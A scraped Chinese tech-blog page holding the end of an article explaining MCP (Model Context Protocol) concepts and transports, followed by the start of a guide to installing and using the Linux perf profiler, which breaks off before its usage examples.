<li>每个设备都不一样，乱七八糟</li>
</ul>
<p>1996 年：</p>
<ul>
<li>Intel、微软、IBM 等巨头联合推出 USB 标准</li>
<li>一个接口统一所有设备</li>
<li>谁制定标准，谁就掌握话语权</li>
</ul>
<p>今天：</p>
<ul>
<li>USB 成为事实标准</li>
<li>USB-IF（USB 标准化组织）掌握生态控制权</li>
<li>新技术（Type-C、USB4）都要通过他们认证</li>
</ul>
<h4 data-id="heading-12">MCP 想做的就是 AI 领域的 USB</h4>
<p>Anthropic 推 MCP 的真实意图：</p>
<ol>
<li><strong>制定规则</strong>：让大家按自己定的协议开发</li>
<li><strong>占领生态</strong>：所有工具提供商、AI 应用都接入 MCP</li>
<li><strong>话语权</strong>：在未来的标准委员会中占据关键位置</li>
</ol>
<p>如果 MCP 真的成为行业共识：</p>
<ul>
<li>所有模型的工具调用格式可能被统一</li>
<li>Anthropic 在标准委员会的位置举足轻重</li>
<li>能影响整个 AI 工具生态的走向</li>
</ul>
<p><strong>对开发者来说</strong>，MCP 的价值在于：</p>
<ol>
<li>✅ <strong>快速接入现成服务</strong>：不用研究 API 文档，装个 MCP Server 就行</li>
<li>✅ <strong>团队协作规范</strong>：统一配置格式，方便版本控制</li>
<li>✅ <strong>参与生态建设</strong>：早期参与者能占先机</li>
<li>✅ <strong>降低集成成本</strong>：一次开发，到处运行</li>
</ol>
<p>但也要认清：</p>
<ul>
<li>⚠️ MCP 还在早期，规范可能变化</li>
<li>⚠️ 生态不够成熟，可用工具有限</li>
<li>⚠️ 不是所有场景都适合用 MCP</li>
<li>⚠️ 核心业务逻辑建议自己掌控</li>
</ul>
<hr/>
<h2 data-id="heading-13">二、MCP 的工作原理</h2>
<p>理解了 MCP 是什么，我们来看它具体是怎么工作的。</p>
<h3 data-id="heading-14">2.1 核心工作流程</h3>
<p>MCP 的工作流程分为三步，我们用一个实际例子说明：</p>
<p><strong>场景</strong>：用户在 Cursor 中问 AI："北京天安门的经纬度是多少？"</p>
<pre><code class="hljs language-markdown" lang="markdown">第 1 步：用户提问
┌─────────────────────┐
│   用户               │
│  "北京天安门的经纬   │
│   度是多少？"        │
└──────────┬──────────┘
<span class="hljs-code">           │
           ▼
</span>
第 2 步：MCP 客户端询问 AI
┌─────────────────────┐
│  MCP 客户端          │
│  (Cursor)           │
│                      │
│  把问题和可用工具    │
│  列表发给 AI：       │
│  - 地理编码工具      │
│  - 路径规划工具      │
│  - 天气查询工具      │
└──────────┬──────────┘
<span class="hljs-code">           │
           ▼
</span>
第 3 步：AI 决策
┌─────────────────────┐
│  AI 模型             │
│  (GPT-4/Claude)     │
│                      │
│  分析后决定：        │
│  ✓ 使用「地理编码」  │
│    工具              │
│  ✓ 参数：            │
│    address=         │
│    "北京天安门"      │
└──────────┬──────────┘
<span class="hljs-code">           │
           ▼
</span>
第 4 步：MCP 服务端执行
┌─────────────────────┐
│  MCP 服务端          │
│  (高德地图 API)     │
│                      │
│  收到请求后：        │
│  1. 调用高德地图API  │
│  2. 获取坐标数据     │
│  3. 返回结果：       │
│     116.397428,     │
│     39.90923        │
└──────────┬──────────┘
<span class="hljs-code">           │
           ▼
</span>
第 5 步：AI 生成友好回复
┌─────────────────────┐
│  用户看到的回复：    │
│                      │
│  "北京天安门的经纬   │
│   度是：             │
│   经度：116.397428  │
│   纬度：39.90923"   │
└─────────────────────┘
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li>MCP 客户端负责和 AI 模型通信（这部分用的是 Function Call）</li>
<li>MCP 服务端负责真正执行工具逻辑（调用真实的 API）</li>
<li>中间的数据传输按照 MCP 协议标准进行</li>
</ul>
<blockquote>
<p>💡 <strong>Tip</strong>：MCP 没有改变 AI 的决策过程，只是规范了"工具列表 → AI 决策 → 工具执行"这个流程的数据格式。</p>
</blockquote>
<hr/>
<h3 data-id="heading-15">2.2 MCP 的三个核心概念</h3>
<p>MCP 定义了三种能力类型，理解它们只需记住：<strong>给什么、做什么、怎么做</strong>。</p>
<h4 data-id="heading-16">📦 Resources（资源）—— 给 AI "看"的东西</h4>
<p><strong>简单说</strong>：只读的数据源，AI 可以读取但不能修改。</p>
<p><strong>常见例子</strong>：</p>
<ul>
<li>文件内容（代码、文档、配置）</li>
<li>数据库记录（用户数据、订单信息）</li>
<li>API 响应（第三方服务返回的数据）</li>
</ul>
<p><strong>使用场景</strong>："分析一下这个文件有什么问题" → AI 读取文件内容（Resource）→ 分析并给出建议</p>
<hr/>
<h4 data-id="heading-17">🛠️ Tools（工具）—— AI 能"做"的事情</h4>
<p><strong>简单说</strong>：可执行的函数，AI 调用后会产生实际效果。</p>
<p><strong>常见例子</strong>：</p>
<ul>
<li>查询地理坐标、规划路线</li>
<li>发送邮件、创建日历事件</li>
<li>读写数据库、执行系统命令</li>
</ul>
<p><strong>使用场景</strong>："帮我查北京的天气" → AI 调用天气查询工具（Tool）→ 返回实时天气数据</p>
<hr/>
<h4 data-id="heading-18">💬 Prompts（提示词模板）—— 标准化的工作流</h4>
<p><strong>简单说</strong>：预定义的对话模板，用户一键触发常见任务。</p>
<p><strong>常见例子</strong>：</p>
<ul>
<li>"代码审查"：自动分析性能、安全、可读性</li>
<li>"生成文档"：根据代码自动生成 README</li>
<li>"Bug 诊断"：系统化排查问题</li>
</ul>
<p><strong>使用场景</strong>：用户选择"代码审查"模板 → 自动填充代码 → AI 按模板执行审查流程</p>
<hr/>
<p><strong>一句话区分</strong>：</p>

























<table><thead><tr><th>概念</th><th>一句话说明</th><th>最常见用途</th></tr></thead><tbody><tr><td><strong>Resources</strong></td><td>AI 读取的数据</td><td>读取文件、查询数据库</td></tr><tr><td><strong>Tools</strong></td><td>AI 执行的操作</td><td><strong>调用外部 API</strong>（最常用）</td></tr><tr><td><strong>Prompts</strong></td><td>用户触发的模板</td><td>标准化工作流</td></tr></tbody></table>
<blockquote>
<p>💡 <strong>Tip</strong>：实际使用中 <strong>Tools 占 90%</strong>，Resources 适合需要大量上下文的场景，Prompts 用于固定流程。</p>
</blockquote>
<hr/>
<h3 data-id="heading-19">2.3 MCP 的传输方式</h3>
<p>MCP 支持两种主流传输方式（还有第三种 Streamable HTTP，但较少用），理解它们只需记住：<strong>本地还是远程</strong>。</p>
<h4 data-id="heading-20">方式 1：STDIO —— 本地进程通信</h4>
<p><strong>简单说</strong>：Cursor 启动一个本地程序（如 Node.js 脚本），通过标准输入输出通信。</p>
<p><strong>适用场景</strong>：</p>
<ul>
<li>本地文件系统操作（读写文件、搜索代码）</li>
<li>本地数据库查询（SQLite、本地 MySQL）</li>
<li>开发和调试自己的 MCP Server</li>
</ul>
<p><strong>优点</strong>：快、安全、不需要网络<br/>
<strong>缺点</strong>：只能本地用，需要安装依赖</p>
<p><strong>典型配置</strong>：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"/path/to/mcp-server.js"</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h4 data-id="heading-21">方式 2：SSE —— 远程 HTTP 服务</h4>
<p><strong>简单说</strong>：Cursor 通过网络访问远程服务器（如高德地图的云端 API）。</p>
<p><strong>适用场景</strong>：</p>
<ul>
<li>第三方服务（地图、天气、翻译）</li>
<li>企业内部 API（统一部署的工具）</li>
<li>生产环境（多人共享同一个服务）</li>
</ul>
<p><strong>优点</strong>：免安装、可共享、易更新<br/>
<strong>缺点</strong>：需要网络，有延迟</p>
<p><strong>典型配置</strong>：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://mcp.example.com/sse?key=your_key"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<p><strong>如何选择？</strong></p>






























<table><thead><tr><th>你的需求</th><th>推荐方式</th><th>典型例子</th></tr></thead><tbody><tr><td>读写本地文件</td><td>STDIO</td><td>文件搜索、代码分析</td></tr><tr><td>查询本地数据库</td><td>STDIO</td><td>SQLite、本地 PostgreSQL</td></tr><tr><td>调用第三方 API</td><td>SSE</td><td>高德地图、天气服务</td></tr><tr><td>团队共享工具</td><td>SSE</td><td>企业内部 API、统一认证</td></tr></tbody></table>
<blockquote>
<p>💡 <strong>Tip</strong>：记住一句话：<strong>本地用 STDIO，远程用 SSE</strong>。</p>
</blockquote>
<hr/>
<h2 data-id="heading-22">写在最后：看懂本质，少踩坑</h2>
<p>读到这里，你应该已经明白：</p>
<p><strong>MCP 不是什么黑科技</strong>，它就是把 Function Call 包了一层标准化协议。<br/>
<strong>MCP 不会让 AI 变聪明</strong>，该选错工具还是会选错，该提取错参数还是会提取错。<br/>
<strong>MCP 也不是免费午餐</strong>，API 调用成本该谁付还是谁付。</p>
<p>那为什么还要了解 MCP？</p>
<p>因为它代表了一个趋势：<strong>AI 工具生态的标准化</strong>。就像当年的 USB 标准，虽然技术上没什么创新，但统一了接口，让整个生态繁荣起来。</p>
<hr/>
<h3 data-id="heading-23">给你三个建议</h3>
<p><strong>1. 不要盲目追新</strong></p>
<p>看到 MCP 火了就觉得必须用，这是最大的误区。如果你的项目：</p>
<ul>
<li>工具就几个，都是自己的 API</li>
<li>一个人开发，不需要团队协作</li>
<li>对工具调用有深度定制需求</li>
</ul>
<p>那自己实现 Function Call 可能更合适，掌控力更强，调试也更方便。</p>
<hr/>
<p><strong>2. 也不要一棍子打死</strong></p>
<p>如果你需要快速接入：</p>
<ul>
<li>高德地图、百度地图这类现成服务</li>
<li>团队共享的标准化工具</li>
<li>开源社区提供的 MCP Server</li>
</ul>
<p>那 MCP 能帮你省不少事，不用研究每个 API 的文档，装上就能用。</p>
<hr/>
<p><strong>3. 混合策略最务实</strong></p>
<p><strong>核心业务逻辑自己掌控，通用能力用 MCP 快速接入</strong>。</p>
<p>比如你做一个智能客服：</p>
<ul>
<li>查订单、查库存 → 自己实现（核心业务）</li>
<li>地图导航、天气查询 → 用 MCP（通用能力）</li>
<li>发邮件、发短信 → 用 MCP（标准化操作）</li>
</ul>
<p>这样既能保证核心竞争力，又能享受生态红利。</p>
<hr/>
<h3 data-id="heading-24">最后一句话</h3>
<p><strong>MCP 是个好协议，但不要神化它。</strong></p>
<p>技术永远是为业务服务的。理解它的本质，看清它的边界，在合适的场景用好它——这才是工程师该有的态度。</p>
<p>就像你不会因为 USB 出现了，就把所有设备都换成 USB 接口。有些场景该用雷电口还得用雷电口，有些场景干脆直接焊线更可靠。</p>
<p><strong>工具是死的，人是活的。别让工具框住了思维。</strong></p>
<p>下篇我们聊实战：如何在 Cursor 中配置 MCP，手把手接入高德地图，让你的 AI 助手真正"动"起来。</p>
<hr/>
<h2 data-id="heading-25">参考资料</h2>
<p>📖 <strong>官方文档</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io" target="_blank" title="https://modelcontextprotocol.io" ref="nofollow noopener noreferrer">Anthropic MCP 协议规范</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcursor.com%2Fcn%2Fdocs%2Fcontext%2Fmcp" target="_blank" title="https://cursor.com/cn/docs/context/mcp" ref="nofollow noopener noreferrer">Cursor MCP 文档</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Perf 工具与火焰图使用指南]]></title>    <link>https://juejin.cn/post/7581698074361135113</link>    <guid>https://juejin.cn/post/7581698074361135113</guid>    <pubDate>2025-12-09T10:23:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581698074361135113" data-draft-id="7581666412021317641" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Perf 工具与火焰图使用指南"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-09T10:23:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Mr_lai"/> <meta itemprop="url" content="https://juejin.cn/user/905653310994535"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Perf 工具与火焰图使用指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/905653310994535/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Mr_lai
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T10:23:05.000Z" title="Tue Dec 09 2025 10:23:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Perf 工具与火焰图使用指南</h2>
<blockquote>
<p><strong>参考资料</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.brendangregg.com%2Fflamegraphs.html" target="_blank" title="https://www.brendangregg.com/flamegraphs.html" ref="nofollow noopener noreferrer">Brendan Gregg's Flame Graphs</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbrendangregg%2FFlameGraph%2Fblob%2Fmaster%2FREADME.md" target="_blank" title="https://github.com/brendangregg/FlameGraph/blob/master/README.md" ref="nofollow noopener noreferrer">FlameGraph GitHub</a></li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-1">目录</h3>
<ul>
<li><a href="#%E4%B8%80perf-%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D" title="#%E4%B8%80perf-%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D">一、Perf 工具介绍</a></li>
<li><a href="#%E4%BA%8Cperf-%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F" title="#%E4%BA%8Cperf-%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F">二、Perf 工作模式</a></li>
<li><a href="#%E4%B8%89perf-%E5%AE%89%E8%A3%85" title="#%E4%B8%89perf-%E5%AE%89%E8%A3%85">三、Perf 安装</a></li>
<li><a href="#%E5%9B%9Bperf-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95" title="#%E5%9B%9Bperf-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95">四、Perf 使用方法</a></li>
<li><a href="#%E4%BA%94%E7%94%9F%E6%88%90%E7%81%AB%E7%84%B0%E5%9B%BE" title="#%E4%BA%94%E7%94%9F%E6%88%90%E7%81%AB%E7%84%B0%E5%9B%BE">五、生成火焰图</a></li>
</ul>
<hr/>
<h3 data-id="heading-2">一、Perf 工具介绍</h3>
<p><code>perf</code> 命令（performance 的缩写），是 <a href="https://link.juejin.cn?target=https%3A%2F%2Fso.csdn.net%2Fso%2Fsearch%3Fq%3DLinux%26spm%3D1001.2101.3001.7020" target="_blank" title="https://so.csdn.net/so/search?q=Linux&amp;spm=1001.2101.3001.7020" ref="nofollow noopener noreferrer">Linux</a> 系统提供的性能分析工具集，包含多种子工具，能够监测多种硬件及软件性能指标，包括 CPU、内存、IO 等，这些可监测指标我们称为 <strong>Event</strong>。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[Perf 工具] --&gt; B[Hardware Event]
    A --&gt; C[Software Event]
    A --&gt; D[Tracepoint Event]
    B --&gt; B1[CPU 周期]
    B --&gt; B2[Cache 缺失]
    B --&gt; B3[分支预测]
    C --&gt; C1[上下文切换]
    C --&gt; C2[缺页异常]
    C --&gt; C3[系统调用]
    D --&gt; D1[内核跟踪点]
    D --&gt; D2[Slab 分配]
</code></pre>
<hr/>
<h3 data-id="heading-3">二、Perf 工作模式</h3>
<h4 data-id="heading-4">2.1 计数模式</h4>
<p>记录 perf 执行过程中 event 的出现次数。</p>
<h4 data-id="heading-5">2.2 采样模式</h4>
<p>在 perf 执行过程中，按照指定频率去采样 event，每次采样时，记录当前性能指标信息（CPU、进程 ID、运行栈等）。</p>
<blockquote>
<p>⚠️ <strong>注意</strong>：这种方式由于每次都记录信息，所以额外的资源消耗是比较大的，需要权衡采样频率。</p>
</blockquote>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph 计数模式
        A1[开始监控] --&gt; A2[统计 Event 次数] --&gt; A3[输出统计结果]
    end
    subgraph 采样模式
        B1[开始监控] --&gt; B2[按频率采样] --&gt; B3[记录详细信息] --&gt; B4[生成数据文件]
    end
</code></pre>
<hr/>
<h3 data-id="heading-6">三、Perf 安装</h3>
<h4 data-id="heading-7">3.1 通过包管理器安装（Ubuntu）</h4>
<p>对于 Ubuntu 等 Linux 系统发行版，都提供了对应的包，只要根据内核版本进行安装即可：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在 Ubuntu 下安装</span>
sudo apt-get install linux-tools-common
sudo apt-get install linux-tools-<span class="hljs-string">"<span class="hljs-subst">$(uname -r)</span>"</span>
sudo apt-get install linux-cloud-tools-<span class="hljs-string">"<span class="hljs-subst">$(uname -r)</span>"</span>
sudo apt-get install linux-tools-generic
sudo apt-get install linux-cloud-tools-generic
</code></pre>
<blockquote>
<p>💡 <strong>提示</strong>：Linux 系统可能无法找到和 kernel 版本相同的工具安装包，可以使用其他版本替换。</p>
</blockquote>
<p>如果版本不匹配，可以手动创建软链接：</p>
<pre><code class="hljs language-bash" lang="bash">sudo <span class="hljs-built_in">rm</span> /usr/bin/perf
sudo <span class="hljs-built_in">ln</span> -s /usr/lib/linux-tools-4.15.0-163/perf /usr/local/bin/perf
</code></pre>
<h4 data-id="heading-8">3.2 从源码编译安装（推荐）</h4>
<blockquote>
<p>⚠️ <strong>重要提示</strong>：不能直接 <code>make</code>，需要先安装某些依赖，否则会导致某些异常。缺少某些库请参照编译的提示进行安装。</p>
</blockquote>
<p><strong>内核资源</strong>：</p>
<ul>
<li>内核官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.kernel.org%2F" target="_blank" title="https://www.kernel.org/" ref="nofollow noopener noreferrer">www.kernel.org/</a></li>
<li>内核下载地址：<a href="https://link.juejin.cn?target=http%3A%2F%2Fftp.sjtu.edu.cn%2Fsites%2Fftp.kernel.org%2Fpub%2Flinux%2Fkernel%2F" target="_blank" title="http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/" ref="nofollow noopener noreferrer">ftp.sjtu.edu.cn/sites/ftp.k…</a></li>
</ul>
<p><strong>编译步骤</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 下载源码</span>
git <span class="hljs-built_in">clone</span> git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git

<span class="hljs-comment"># 2. 切换至对应的版本分支</span>
<span class="hljs-built_in">cd</span> linux
git branch -r      <span class="hljs-comment"># 查看所有远程分支</span>
git branch -a      <span class="hljs-comment"># 查看所有分支</span>
git checkout v5.4  <span class="hljs-comment"># 切换到 v5.4 分支</span>

<span class="hljs-comment"># 3. 编译安装 perf</span>
<span class="hljs-built_in">cd</span> tools/perf
make

<span class="hljs-comment"># 4. 测试 perf 是否成功安装</span>
<span class="hljs-built_in">cd</span> ../..
sudo perf top
</code></pre>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[下载源码] --&gt; B[切换版本分支]
    B --&gt; C[进入 tools/perf]
    C --&gt; D[执行 make]
    D --&gt; E[验证安装]
</code></pre>
<hr/>
<h3 data-id="heading-9">四、Perf 使用方法</h3>
<h4 data-id="heading-10">4.1 perf list</h4>
<p>查看当前系统支持的性能事件。使用 <code>perf list</code> 命令可以显示当前软硬件环境下支持的所有事件：</p>

























<table><thead><tr><th>事件类型</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><strong>Hardware Event</strong></td><td>由 PMU 部件产生，在特定条件下探测性能事件</td><td>CPU 周期、分支指令、TLB 重填例外、Cache 缺失</td></tr><tr><td><strong>Software Event</strong></td><td>内核产生的事件，统计操作系统相关性能事件</td><td>系统调用次数、上下文切换次数、任务迁移次数、缺页例外次数</td></tr><tr><td><strong>Tracepoint Event</strong></td><td>内核中静态 tracepoint 触发的事件</td><td>slab 分配器的分配次数等</td></tr></tbody></table>
<h4 data-id="heading-11">4.2 perf top</h4>
<p>类似 <code>top</code> 命令，主要用于<strong>实时分析</strong>各个函数在某个性能事件上的热度，能够快速定位热点函数，包括应用程序函数、模块函数与内核函数，甚至能够定位到热点指令。</p>
<blockquote>
<p>🔐 <strong>执行需要 root 权限</strong></p>
</blockquote>
<p><strong>常用参数</strong>：</p>

















<table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-e &lt;event&gt;</code></td><td>指明要分析的性能事件</td></tr><tr><td><code>-p &lt;pid&gt;</code></td><td>仅分析目标进程及其创建的线程</td></tr></tbody></table>
<h4 data-id="heading-12">4.3 perf stat</h4>
<p>用于统计 event 出现的次数（计数模式）。</p>
<p><strong>默认事件说明</strong>：</p>









































<table><thead><tr><th>事件名称</th><th>说明</th></tr></thead><tbody><tr><td><code>cpu-clock</code></td><td>任务真正占用的处理器时间（ms）。<code>CPUs utilized = cpu-clock / time elapsed</code>，值高说明程序多数时间花费在 CPU 计算上而非 IO</td></tr><tr><td><code>context-switches</code></td><td>上下文的切换次数</td></tr><tr><td><code>CPU-migrations</code></td><td>处理器迁移次数。Linux 为维持多处理器负载均衡，会将任务从一个 CPU 迁移到另一个 CPU</td></tr><tr><td><code>page-faults</code></td><td>缺页异常次数。页面未建立、不在内存、映射关系未建立、TLB 不命中、权限不匹配等都会触发</td></tr><tr><td><code>cycles</code></td><td>消耗的处理器周期数</td></tr><tr><td><code>instructions</code></td><td>执行的指令数。IPC 为平均每个 CPU cycle 执行的指令数</td></tr><tr><td><code>branches</code></td><td>遇到的分支指令数</td></tr><tr><td><code>branch-misses</code></td><td>预测错误的分支指令数</td></tr></tbody></table>
<p><strong>参数说明</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">-e &lt;event&gt;  <span class="hljs-comment"># 指定性能事件（可以是多个，用 , 分隔）</span>
-p &lt;pid&gt;    <span class="hljs-comment"># 指定待分析进程的 pid（可以是多个，用 , 分隔）</span>
-t &lt;tid&gt;    <span class="hljs-comment"># 指定待分析线程的 tid（可以是多个，用 , 分隔）</span>
-a          <span class="hljs-comment"># 从所有 CPU 收集系统数据</span>
-d          <span class="hljs-comment"># 打印更详细的信息，可重复 3 次</span>
            <span class="hljs-comment">#   -d：L1 和 LLC data cache</span>
            <span class="hljs-comment">#   -d -d：dTLB 和 iTLB events</span>
            <span class="hljs-comment">#   -d -d -d：增加 prefetch events</span>
</code></pre>
<h4 data-id="heading-13">4.4 perf record</h4>
<p>采样模式，perf 收集采样信息并记录在文件中，可以离线分析。使用 <code>perf report</code> 解析收集的采样数据文件。</p>
<p><strong>参数说明</strong>：</p>





















































<table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-e</code></td><td>选择性能事件</td></tr><tr><td><code>-p</code></td><td>待分析进程的 id</td></tr><tr><td><code>-t</code></td><td>待分析线程的 id</td></tr><tr><td><code>-a</code></td><td>分析整个系统的性能</td></tr><tr><td><code>-C</code></td><td>只采集指定 CPU 数据</td></tr><tr><td><code>-F</code></td><td>采样频率，每秒多少次</td></tr><tr><td><code>-c</code></td><td>事件的采样周期</td></tr><tr><td><code>-o</code></td><td>指定输出文件，默认为 <code>perf.data</code></td></tr><tr><td><code>-A</code></td><td>以 append 的方式写输出文件</td></tr><tr><td><code>-f</code></td><td>以 OverWrite 的方式写输出文件</td></tr><tr><td><code>-g</code></td><td>记录函数间的调用关系</td></tr></tbody></table>
<p><strong>使用示例</strong>：</p>
